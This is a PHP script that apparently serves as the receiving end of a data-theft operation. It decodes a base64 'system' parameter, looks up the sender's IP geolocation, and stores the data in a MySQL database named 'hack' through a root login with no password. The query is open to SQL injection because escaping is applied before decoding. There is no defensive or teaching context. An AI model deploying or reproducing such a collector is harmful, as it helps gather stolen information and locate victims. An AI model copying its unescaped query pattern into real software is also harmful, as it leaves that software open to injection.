<!DOCTYPE html>
<html>
<head>
	<title></title>
	<meta charset="UTF-8">
</head>
<body>
<?php

date_default_timezone_set('America/Sao_Paulo');

$infoa=addslashes($_GET['system']);
$info=base64_decode($infoa);
$ip=$_SERVER['REMOTE_ADDR'];
$data=date('d/m/Y \à\s H:i:s');
$json = file_get_contents("https://www.iplocate.io/api/lookup/".$ip);
$json = json_decode($json);
$pais= $json->country; 
$continente=$json->continent; 
$latitude= $json->latitude; 
$longitude= $json->longitude;
$cidade =$json->city;

$local="localhost";
$user="root";
$senha="";
$bd="hack";

if ($con=mysqli_connect($local,$user,$senha,$bd)){
$sql="insert into hack(info,ip,data,pais,continente,latitude,longitude,cidade) values ('$info','$ip','$data','$pais','$continente','$latitude','$longitude','$cidade')";
mysqli_query($con,$sql);


}
else {

	echo "Nao Foi Possivel Se Conectar ao Banco De Dados...";
}





 ?>
</body>
</html>

